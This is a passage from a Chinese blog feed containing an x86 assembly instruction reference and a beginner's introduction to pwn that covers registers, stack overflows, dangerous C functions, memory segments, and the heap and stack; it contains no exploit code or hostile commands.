title="lea"></a>lea</h4><p>lea指令将其第二个操作对象指定的地址放入其<strong>第一个操作对象指定的寄存器中</strong>。需要注意的是，内存位置的内容不会被加载，并且只有有效地址会被计算并放入寄存器中。这对于获取指向内存区域的指针非常有用。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea &lt;reg32&gt;,&lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea edi, [ebx+4*esi] ; 将地址EBX+4*ESI放入EDI<br>lea eax, [var] ; 将var中的值放在EAX中<br></code></pre></td></tr></table></figure><h2 id="算数和逻辑运算符"><a href="#算数和逻辑运算符" class="headerlink" title="算数和逻辑运算符"></a>算数和逻辑运算符</h2><h4 id="add-整数加法"><a href="#add-整数加法" class="headerlink" title="add-整数加法"></a>add-整数加法</h4><p>add指令将其两个操作对象相加，将结果存储在第一个操作对象中。需要注意的是，虽然两个操作对象都可以是寄存器，<strong>但最多只有一个操作对象可以是内存位置</strong>。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add &lt;reg&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;mem&gt;<br>add &lt;mem&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;con&gt;<br>add &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax, 10 ; EAX ← EAX + 10<br>add BYTE PTR [var], 10 ; 将存储在内存地址var的单字节值加上10<br></code></pre></td></tr></table></figure><h4 id="sub-整数减法"><a href="#sub-整数减法" class="headerlink" title="sub-整数减法"></a>sub-整数减法</h4><p>sub指令将其第一个操作对象的值减去第二个对象的值，并将结果存储在第一个对象的内存位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub &lt;reg&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;mem&gt;<br>sub &lt;mem&gt;,&lt;reg&gt;<br>sub &lt;reg&gt;,&lt;con&gt;<br>sub &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sub al, ah ; AL ← AL - AH<br>sub eax, 216 ; 从存储在EAX中的值中减去216<br></code></pre></td></tr></table></figure><h4 id="inc-dec-递增，递减"><a href="#inc-dec-递增，递减" class="headerlink" title="inc,dec-递增，递减"></a>inc,dec-递增，递减</h4><p>inc指令将其操作对象的内容+1；DEC指令将其操作对象的内容-1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">inc &lt;reg&gt;<br>inc &lt;mem&gt;<br>dec &lt;reg&gt;<br>dec &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">dec eax ; 从EAX的内容中减去1<br>inc DWORD PTR [var] ; 将存储在位置var的32位整数加1<br></code></pre></td></tr></table></figure><h4 id="imul-整数乘法"><a href="#imul-整数乘法" class="headerlink" title="imul-整数乘法"></a>imul-整数乘法</h4><p>imul指令有两种基本格式：两个操作对象和三个操作对象。</p><p>有两个操作对象时将其两个操作对象相乘，并将结果储存在第一个操作对象当中，其中，第一个对象必须是寄存器。</p><p>有三个操作对象时，将第二个操作对象与第三个操作对象相乘，并将其结果储存在第一个操作对象当中，其中第一个对象必须是寄存器，第三个对象必须是常量值。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul &lt;reg32&gt;,&lt;reg32&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;<br>imul &lt;reg32&gt;,&lt;reg32&gt;,&lt;con&gt;<br>imul &lt;reg32&gt;,&lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">imul eax, [var] ; 将EAX的内容乘以内存位置var的32位内容并将结果存储在EAX中<br>imul esi, edi, 25 ; ESI → EDI * 25<br></code></pre></td></tr></table></figure><h4 id="idiv-整数除法"><a href="#idiv-整数除法" class="headerlink" title="idiv-整数除法"></a>idiv-整数除法</h4><p>idiv指令将64位整数<code>EDX:EAX</code>的内容除以指定的操作对象值。结果存储在EAX中，其余数的存储在EDX中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv &lt;reg32&gt;<br>idiv &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">idiv ebx ; 将EDX:EAX的内容除以EBX的内容。把商放在EAX中，余放在EDX中<br>idiv DWORD PTR [var] ; 将EDX:EAX的内容除以存储在内存位置var的32位值。把商放在EAX中，余放在EDX中<br></code></pre></td></tr></table></figure><h4 id="and-or-xor-按位与、或和异或"><a href="#and-or-xor-按位与、或和异或" class="headerlink" title="and,or xor-按位与、或和异或"></a>and,or xor-按位与、或和异或</h4><p>这些指令对其操作对象执行指定的位运算（分别为按位与、或和异或），并将结果放在第一个操作对象位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and &lt;reg&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;mem&gt;<br>and &lt;mem&gt;,&lt;reg&gt;<br>and &lt;reg&gt;,&lt;con&gt;<br>and &lt;mem&gt;,&lt;con&gt;<br><br>or &lt;reg&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;mem&gt;<br>or &lt;mem&gt;,&lt;reg&gt;<br>or &lt;reg&gt;,&lt;con&gt;<br>or &lt;mem&gt;,&lt;con&gt;<br><br>xor &lt;reg&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;mem&gt;<br>xor &lt;mem&gt;,&lt;reg&gt;<br>xor &lt;reg&gt;,&lt;con&gt;<br>xor &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">and eax, 0fH ; 清除EAX的除最后4位以外的所有位<br>xor edx, edx ; 将EDX的内容设置为零<br></code></pre></td></tr></table></figure><h4 id="not-按位取反"><a href="#not-按位取反" class="headerlink" title="not-按位取反"></a>not-按位取反</h4><p>not指令触发反转操作对象中的所有位，其结果称为反码。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not &lt;reg&gt;<br>not &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">not BYTE PTR [var] ; 取反内存位置var的字节中的所有位<br></code></pre></td></tr></table></figure><h4 id="neg-求补"><a href="#neg-求补" class="headerlink" title="neg-求补"></a>neg-求补</h4><p>neg是汇编指令中的求补指令，对操作对象执行求补运算：用0减去操作对象，然后结果返回操作对象；或是直接将操作对象按位取反后+1</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg &lt;reg&gt;<br>neg &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">neg eax ; EAX → - EAX<br></code></pre></td></tr></table></figure><h4 id="shl-shr-左移，右移"><a href="#shl-shr-左移，右移" class="headerlink" title="shl, shr-左移，右移"></a>shl, shr-左移，右移</h4><p>这些指令将其第一个操作对象内容中的位左右移位，用零填充产生的空位位置。移位后的操作对象最多可以移位31位。要移位的位数由第二个操作对象指定，该操作对象可以是8位常量，也可以是寄存器CL。</p><p>在任一情况下，以32为模执行大于31的移位计数。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl &lt;reg&gt;,&lt;con8&gt;<br>shl &lt;mem&gt;,&lt;con8&gt;<br>shl &lt;reg&gt;,&lt;cl&gt;<br>shl &lt;mem&gt;,&lt;cl&gt;<br><br>shr &lt;reg&gt;,&lt;con8&gt;<br>shr &lt;mem&gt;,&lt;con8&gt;<br>shr &lt;reg&gt;,&lt;cl&gt;<br>shr &lt;mem&gt;,&lt;cl&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">shl eax, 1 ; 将EAX的值乘以2（如果最高有效位为0）<br>shr ebx, cl ; 将EBX的值除以2^n^的结果的下限存储在EBX中，其中n是CL中的值<br></code></pre></td></tr></table></figure><h2 id="控制流指令"><a href="#控制流指令" class="headerlink" title="控制流指令"></a>控制流指令</h2><p>x86处理器维护一个指令指针（IP）寄存器，它是一个32位值，指示当前指令在内存中的起始位置。通常，在执行一条指令后，它会递增以指向内存中的下一条指令的起始位置。IP寄存器不能直接操作，而是由提供的控制流指令隐式更新。</p><blockquote><p>我们使用符号&lt;LABEL&gt;来表示代码中已标记的位置。通过输入标签名称后跟冒号，可以在x86汇编代码中的任意位置插入标签。</p></blockquote><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">       mov esi, [ebp+8]<br>begin: xor ecx, ecx<br>       mov eax, [esi]<br></code></pre></td></tr></table></figure><p>此代码段中的第二条指令被标记为begin。在代码的其他地方，我们可以使用更方便的符号名称begin来引用此指令所在的内存中的位置。这个标签只是表示位置的一种方便方式，而不是它的32位值。</p><h4 id="jmp-跳转"><a href="#jmp-跳转" class="headerlink" title="jmp-跳转"></a>jmp-跳转</h4><p>将程序控制流转移到操作对象指示的内存位置上</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp &lt;label&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp begin ; 跳到标记为begin的指令位置<br></code></pre></td></tr></table></figure><h4 id="jcondition-条件跳转"><a href="#jcondition-条件跳转" class="headerlink" title="jcondition-条件跳转"></a>jcondition-条件跳转</h4><p>这些指令是基于一组条件码状态判断是否进行跳转，该条件码被存储在称为机器状态字的特殊寄存器中。</p><p>机器状态字的内容包括有关上次执行的算术运算的信息。例如，此字的某一比特位表示最后结果是否为零，某另一个比特位指示上次结果是否为负数。</p><p>基于这些条件码，可以执行多个条件跳转。例如，如果上次算术运算的结果为零，则JZ指令执行到指定操作对象标签的跳转。否则，控制按顺序前进到下一条指令。</p><p>许多条件分支的名字都是根据上一次执行的特殊比较指令cmp命名的。例如，条件分支（如JLE和JNE）基于首先对所需操作对象执行cmp操作。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">je &lt;label&gt;  ; 相等时跳转<br>jne &lt;label&gt; ; 不相等时跳转<br>jz &lt;label&gt;  ; 最后结果为零时跳转<br>jg &lt;label&gt;  ; 大于时跳转<br>jge &lt;label&gt; ; 大于等于时跳转<br>jl &lt;label&gt;  ; 小于时跳转<br>jle &lt;label&gt; ; 小于等于时跳转<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp eax, ebx<br>jle done ; 如果EAX的中的值小于或等于EBX中的值，跳至标签done。否则，继续执行下一条指令<br></code></pre></td></tr></table></figure><h4 id="cmp-比较"><a href="#cmp-比较" class="headerlink" title="cmp-比较"></a>cmp-比较</h4><p>比较两个指定操作对象的值，适当设置机器状态字中的条件代码。此指令等同于sub指令，不同之处在于将丢弃减法结果，而不是替换第一个操作对象。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp &lt;reg&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;mem&gt;<br>cmp &lt;mem&gt;,&lt;reg&gt;<br>cmp &lt;reg&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">cmp DWORD PTR [var], 10<br>jeq loop ; 如果存储在var中的4个字节的值等于4字节整数常量10，则跳转到标记为loop的位置<br></code></pre></td></tr></table></figure><h4 id="call-ret-子程序调用和返回"><a href="#call-ret-子程序调用和返回" class="headerlink" title="call, ret-子程序调用和返回"></a>call, ret-子程序调用和返回</h4><p>这些指令实现一个子程序调用和返回。</p><p>call指令首先将当前代码位置压入到内存中硬件支持的堆栈中，然后无条件跳转到标签操作对象指示的代码位置。与简单的跳转指令不同，call指令保存当前位置，并在子程序完成时返回到此处。</p><p>ret指令实现子程序返回机制。此指令首先从硬件支持的内存堆栈中弹出代码位置，然后无条件跳转至该代码位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call &lt;label&gt;<br>ret<br></code></pre></td></tr></table></figure><hr><p>最近一直被问x86学完了没，这算学完叭（小声bb)🤨</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>x86汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在PWN的边缘疯狂试探</title>
    <link href="/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/"/>
    <url>/2023/03/20/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<p>一点点 pwn 基础——栈和堆、汇编基础和Linux常用保护机制</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>PWN是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似”砰”，对黑客而言，这就是成功实施黑客攻击的声音–砰的一声，被”黑”的电脑或手机就被你操纵了 。</p><p>（上文来自百度）</p><p>个人认为解决PWN题就是利用简单的逆向得到代码，从代码中发现漏洞，再通过二进制或系统调用等方式利用这些漏洞获得目标主机的shell 。</p><p>很酷！！！！！😎</p><h1 id="前知知识"><a href="#前知知识" class="headerlink" title="前知知识"></a>前知知识</h1><p>就是我只知道这么多就来学pwn了</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>寄存器是CPU内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。</p><p>我们常常看到 32位 CPU、64位 CPU 这样的名称，其实指的就是寄存器的大小。</p><p>Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器，如下图所示：</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/271639137915732.jpg"></p><p>在大多数情况下，上图所示的前6个寄存器均可作为通用寄存器使用。</p><p>编译器会根据操作数大小选择合适的寄存器来生成汇编代码。在汇编语言层面，这组通用寄存器以%e(AT&amp;T语法)或直接以e(Intel语法)开头来引用.</p><p>例如<code>mov $5, %eax</code>或<code>mov eax, 5</code>表示将5赋值给寄存器<strong>eax</strong>。</p><p> 不同架构的CPU，寄存器名称被添加不同前缀以指示寄存器的大小。例如x86架构用字母<strong>“e”</strong>作名称前缀，指示寄存器大小为32位；x86_64架构用字母<strong>“r”</strong>作名称前缀，指示各寄存器大小为64位。</p><h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3><p>栈溢出就是数据会占用一个存储空间，但是我们写代码的时候默认输入数据就是符合规定的数据，并没有对输入数据进行限制，这时超出这个空间大小的数据就会输入到合法空间以外的地方并造成破坏。</p><p>借此我们就可以控制这个不允许用户操作的空间内的寄存器，改变寄存器的值达到代码执行的效果。</p><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><p>输入：</p><ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul><p>输出：</p><ul><li>sprintf</li></ul><p>字符串：</p><ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul><h3 id="Linux的一些基础命令"><a href="#Linux的一些基础命令" class="headerlink" title="Linux的一些基础命令"></a>Linux的一些基础命令</h3><p><code>sudo</code> ：SuperUserDo 在需要权限的命令前使用</p><p><code>apt-get</code>：可以执行安装、升级、甚至移除软件这类任务</p><p><code>grep</code>：配合正则表达式食用，用于寻找文件或内容</p><p><code>cat</code>：查看文件</p><p><code>rm</code>：移除文件，还可以使用**-r**来进行递归移除，从而移除整个文件夹</p><p><code>cp</code>：拷贝文件</p><p><code>ls</code>：查看目录下的文件</p><p><del>暂时只想起这么多</del></p><h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><blockquote><p>pwn 研究二进制还是要学习底层计算机语言的😢</p></blockquote><p>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是 <code>ADD</code>。</p><h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><h4 id="段"><a href="#段" class="headerlink" title="段"></a>段</h4><p>一般情况下，程序都是由bss段，text段和date段三个段组成。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/11.png"></p><p>bss 段：只有定义而没有赋初值的全局变量和静态变量。</p><p>data 段：存放在编译阶段 (而非运行时) 就能确定的数据，可读可写。就是通常所说的<strong>静态存储区</strong>，存储赋了初值的全局变量和赋初值的静态变量以及常量。</p><p>text 段：放<strong>程序代码</strong>，在编译时确定，只读。</p><h5 id="bss段"><a href="#bss段" class="headerlink" title=".bss段"></a>.bss段</h5><p>bss段是用来存放未初始化的全局变量和静态变量的一块内存区域，一般在初始化时bss段部分会清零。</p><h5 id="text段"><a href="#text段" class="headerlink" title=".text段"></a>.text段</h5><p>存放程序代码的区域，在编译时确定，只读。</p><p>更进一步讲是存放处理器的机器指令，当各个源文件单独编译之后生成目标文件，经连接器连接各个目标文件并解决各个源文件之间的函数引用。与此同时，还要将所有目标文件中的.text段合在一起，但不是简单的将他们“堆”在一起，还要处理各个段之间函数引用问题。</p><h5 id="date段"><a href="#date段" class="headerlink" title=".date段"></a>.date段</h5><p>用于存放在编译阶段（而非运行时）就能确定的数据，可读可写。也是通常所说的静态存储区，赋了初值的全局变量，常量和静态变量都存放在这个区域。</p><h4 id="Heap-堆"><a href="#Heap-堆" class="headerlink" title="Heap-堆"></a>Heap-堆</h4><p>程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从<code>0x1000</code>到<code>0x8000</code>，起始地址是较小的那个地址(低位），结束地址是较大的那个地址（高位）。</p><p>程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用<code>malloc</code>命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分。</p><blockquote><p>实际上，起始地址会有一段静态数据，这里忽略</p></blockquote><p>举例来说，用户要求得到10个字节内存，那么从起始地址<code>0x1000</code>开始给他分配，一直分配到地址<code>0x100A</code>，如果再要求得到22个字节，那么就分配到<code>0x1020</code>。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-38-37.png"></p><p>这种因为用户主动请求而划分出来的内存区域，就叫做 Heap（堆）。它由<strong>起始地址</strong>开始，从<strong>低位</strong>向<strong>高位</strong>增长。Heap 的一个重要特点就是<strong>不会自动消失</strong>，必须手动释放，或者由垃圾回收机制来回收。</p><h4 id="Strack-栈"><a href="#Strack-栈" class="headerlink" title="Strack-栈"></a>Strack-栈</h4><p>Stack 是由于函数运行而临时占用的内存区域。Stack 是由内存区域的<strong>结束地址</strong>开始，从<strong>高位</strong>向<strong>低位</strong>分配。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。</p><p>比如，内存区域的结束地址是<code>0x8000</code>，第一帧假定是16字节，那么下一次分配的地址就会从<code>0x7FF0</code>开始；第二帧假定需要64字节，那么地址就会移动到<code>0x7FB0</code>。</p><p>举个具体的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">return</span> add_a_and_b(a,b);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码中，系统开始执行<code>main</code>函数时，会为它在内存里面建立一个帧（frame），所有<code>main</code>的内部变量（比如a和b）都保存在这个帧里面。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-50-18.png"></p><p>当调用其他函数时，程序运行到这一行，会新建一个帧。此时存在两个帧：<code>main</code>和<code>add_a_and_b</code>。一般来说，调用栈有多少层，就有多少帧。</p><p><img src="/img/%E5%9C%A8PWN%E7%9A%84%E8%BE%B9%E7%BC%98%E7%96%AF%E7%8B%82%E8%AF%95%E6%8E%A2/Snipaste_2023-03-20_18-49-52.png"></p><p>等到<code>add_a_and_b</code>运行结束，它的帧就会被回收，系统会回到函数<code>main</code>刚才中断执行的地方，继续往下执行。</p><p>生成新的帧，叫做”压栈”，英文是 push；栈的回收叫做”出栈”，英文是 pop。Stack 的特点就是，最晚入栈的帧最早出栈（因为最内层的函数调用，最先结束运行），这就叫做”<strong>后进先出</strong>“的数据结构。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。</p><h4 id="一个🌰"><a href="#一个🌰" class="headerlink" title="一个🌰"></a>一个🌰</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add_a_and_b</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>   <span class="hljs-keyword">return</span> a + b;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-keyword">return</span> add_a_and_b(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将其转换为汇编语言就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs x86">.file&quot;test.c&quot;<br>.text<br>.globladd_a_and_b<br>.typeadd_a_and_b, @function<br>add_a_and_b:<br>.LFB0:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl%edi, -4(%rbp)<br>movl%esi, -8(%rbp)<br>movl-4(%rbp), %edx<br>movl-8(%rbp), %eax<br>addl%edx, %eax<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE0:<br>.sizeadd_a_and_b, .-add_a_and_b<br>.globlmain<br>.typemain, @function<br>main:<br>.LFB1:<br>.cfi_startproc<br>pushq%rbp<br>.cfi_def_cfa_offset 16<br>.cfi_offset 6, -16<br>movq%rsp, %rbp<br>.cfi_def_cfa_register 6<br>movl$3, %esi<br>movl$2, %edi<br>calladd_a_and_b<br>popq%rbp<br>.cfi_def_cfa 7, 8<br>ret<br>.cfi_endproc<br>.LFE1:<br>.sizemain, .-main<br>.ident&quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609&quot;<br>.section.note.GNU-stack,&quot;&quot;,@progbits<br></code></pre></td></tr></table></figure><blockquote><p>以我现在的水平还不是很能看明白，我就是把文件全复制下来了</p></blockquote><p>简化以后主要就是这些内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86">_add_a_and_b:<br>   push   %ebx<br>   mov    %eax, [%esp+8] <br>   mov    %ebx, [%esp+12]<br>   add    %eax, %ebx <br>   pop    %ebx <br>   ret  <br><br>_main:<br>   push   3<br>   push   2<br>   call   _add_a_and_b <br>   add    %esp, 8<br>   ret<br></code></pre></td></tr></table></figure><p>可以看到原程序两个函数<code>add_a_and_b</code>和<code>main</code>对应上面的两个标签<code>_add_a_and_b</code>和<code>_main</code>，每个标签里面是该函数所转成的 CPU 运行流程，每一行就是 CPU 执行的一次操作。</p><p>以其中一行为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86">push   %ebx<br></code></pre></td></tr></table></figure><p>这一行里面，<code>push</code>是 CPU 指令，<code>%ebx</code>是该指令要用到的运算子。一个 